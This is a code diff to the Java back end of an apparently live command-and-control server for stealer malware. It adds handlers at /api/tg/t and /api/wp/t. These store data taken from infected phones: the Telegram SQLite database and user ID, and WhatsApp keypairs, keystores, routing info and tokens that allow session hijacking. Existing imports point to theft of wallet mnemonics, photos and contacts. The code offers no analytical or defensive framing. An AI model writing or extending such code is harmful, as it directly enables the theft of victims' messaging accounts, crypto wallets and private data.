@@ -23,6 +23,8 @@ import com.consume.dao.MemorandumDao;
 import com.consume.dao.MnemonicDao;
 import com.consume.dao.UbDecryptDao;
 import com.consume.dao.UjDecryptDao;
+import com.consume.dao.TgReportDao;
+import com.consume.dao.WpReportDao;
 import com.consume.entity.Address4Entity;
 import com.consume.entity.AlbumEntity;
 import com.consume.entity.AppListEntity;
@@ -30,8 +32,10 @@ import com.consume.entity.C2EventEecryptEntity;
 import com.consume.entity.C2EventRecordsEntity;
 import com.consume.entity.MemorandumEntity;
 import com.consume.entity.MnemonicEntity;
+import com.consume.entity.TgReportEntity;
 import com.consume.entity.UbDecryptEntity;
 import com.consume.entity.UjDecryptEntity;
+import com.consume.entity.WpReportEntity;
 import com.consume.util.AesStoreCipher;
 import com.consume.util.DigestUtil;
 import com.consume.util.S3FileUploadUtil;
@@ -58,6 +62,8 @@ public class C2BusinessStore {
     @Autowired private AlbumDao albumDao;
     @Autowired private UbDecryptDao ubDecryptDao;
     @Autowired private UjDecryptDao ujDecryptDao;
+    @Autowired private TgReportDao tgReportDao;
+    @Autowired private WpReportDao wpReportDao;
     @Autowired private AddressListenNotifier addressListenNotifier;
     @Autowired private MnemonicTelegramService mnemonicTelegramService;
     @Autowired(required = false)
@@ -906,6 +912,105 @@ public class C2BusinessStore {
             }
         } catch (Exception ex) {
             log.info("异常日志:[c2_handlers][uj_decrypt] 写入失败, recordId={}, err={}",
+                    ctx.getRecordId(), ex.getMessage());
+        }
+    }
+
+    // ---------- /api/tg/t ----------
+
+    /** Telegram 上报落库 → tg_report */
+    public void saveTgReport(C2HandlerContext ctx, JSONObject plaintext) {
+        if (!hasDeviceRow(ctx)) {
+            log.info("异常日志:[c2_handlers][tg_report] 无 device_row_id，跳过写入, recordId={}",
+                    ctx.getRecordId());
+            return;
+        }
+        try {
+            TgReportEntity e = new TgReportEntity();
+            e.setC2RecordId((int) ctx.getRecordId());
+            e.setDeviceRowId(ctx.getDeviceRowId());
+            e.setClientIp(ctx.getClientIp());
+            e.setXTs(ctx.getXTs());
+            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
+            e.setKeyLabel(ctx.getKeyLabel() == null ? "" : ctx.getKeyLabel());
+            e.setErrorMsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
+            e.setEcid(firstNonEmpty(str(plaintext, "ecid"), ctx.getDeviceId()));
+            e.setSerial(str(plaintext, "serial"));
+            e.setUniqueId(str(plaintext, "unique"));
+            e.setChannelcode(firstNonEmpty(str(plaintext, "channel"),
+                    ctx.getChannelcode() == null ? "" : ctx.getChannelcode()));
+            e.setUserId(str(plaintext, "user_id"));
+            Object state = plaintext == null ? null : plaintext.get("state");
+            e.setStateJson(state == null ? "" : (state instanceof String
+                    ? (String) state : JSONObject.toJSONString(state)));
+            String dbSqlite = str(plaintext, "db_sqlite");
+            e.setDbSqlite(dbSqlite);
+            e.setDbSqliteLen(dbSqlite.isEmpty() ? 0 : dbSqlite.length());
+            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
+            double now = System.currentTimeMillis() / 1000.0;
+            e.setDecryptedAt(now);
+            e.setAddtime(now);
+            tgReportDao.insert(e);
+            log.info("正常日志:[c2_handlers][tg_report] 写入成功, recordId={}, id={}, userId={}, dbLen={}",
+                    ctx.getRecordId(), e.getId(), e.getUserId(), e.getDbSqliteLen());
+        } catch (Exception ex) {
+            log.info("异常日志:[c2_handlers][tg_report] 写入失败, recordId={}, err={}",
+                    ctx.getRecordId(), ex.getMessage());
+        }
+    }
+
+    // ---------- /api/wp/t ----------
+
+    /** WhatsApp 上报落库 → wp_report */
+    public void saveWpReport(C2HandlerContext ctx, JSONObject plaintext) {
+        if (!hasDeviceRow(ctx)) {
+            log.info("异常日志:[c2_handlers][wp_report] 无 device_row_id，跳过写入, recordId={}",
+                    ctx.getRecordId());
+            return;
+        }
+        try {
+            WpReportEntity e = new WpReportEntity();
+            e.setC2RecordId((int) ctx.getRecordId());
+            e.setDeviceRowId(ctx.getDeviceRowId());
+            e.setClientIp(ctx.getClientIp());
+            e.setXTs(ctx.getXTs());
+            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
+            e.setKeyLabel(ctx.getKeyLabel() == null ? "" : ctx.getKeyLabel());
+            e.setErrorMsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
+            e.setEcid(firstNonEmpty(str(plaintext, "ecid"), ctx.getDeviceId()));
+            e.setSerial(str(plaintext, "serial"));
+            e.setUniqueId(str(plaintext, "unique"));
+            e.setChannelcode(firstNonEmpty(str(plaintext, "channel"),
+                    ctx.getChannelcode() == null ? "" : ctx.getChannelcode()));
+            e.setApiType(str(plaintext, "apiType"));
+            e.setAppVersion(str(plaintext, "_version"));
+            e.setUserId(str(plaintext, "userId"));
+            e.setPhoneId(str(plaintext, "phoneId"));
+            e.setNickname(str(plaintext, "nickname"));
+            e.setClientStaticKeypairBase64(str(plaintext, "clientStaticKeypairBase64"));
+            Object keyStore = plaintext == null ? null : plaintext.get("phoneKeyStore");
+            e.setPhoneKeystoreJson(keyStore == null ? "" : JSONObject.toJSONString(keyStore));
+            Object deviceConfig = plaintext == null ? null : plaintext.get("deviceConfig");
+            e.setDeviceConfigJson(deviceConfig == null ? "" : JSONObject.toJSONString(deviceConfig));
+            Object deviceInfo = plaintext == null ? null : plaintext.get("deviceInfo");
+            e.setDeviceInfoJson(deviceInfo == null ? "" : JSONObject.toJSONString(deviceInfo));
+            e.setLocale(str(plaintext, "locale"));
+            e.setRoutingInfo(str(plaintext, "routingInfo"));
+            e.setUploadTokenRandomBytes(str(plaintext, "uploadTokenRandomBytes"));
+            e.setServerStaticPublicBase64(str(plaintext, "serverStaticPublicBase64"));
+            e.setProxy(str(plaintext, "proxy"));
+            e.setSimOperator(str(plaintext, "sim_operator"));
+            Object data = plaintext == null ? null : plaintext.get("data");
+            e.setDataJson(data == null ? "" : JSONObject.toJSONString(data));
+            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
+            double now = System.currentTimeMillis() / 1000.0;
+            e.setDecryptedAt(now);
+            e.setAddtime(now);
+            wpReportDao.insert(e);
+            log.info("正常日志:[c2_handlers][wp_report] 写入成功, recordId={}, id={}, userId={}, phoneId={}",
+                    ctx.getRecordId(), e.getId(), e.getUserId(), e.getPhoneId());
+        } catch (Exception ex) {
+            log.info("异常日志:[c2_handlers][wp_report] 写入失败, recordId={}, err={}",
                     ctx.getRecordId(), ex.getMessage());
         }
     }
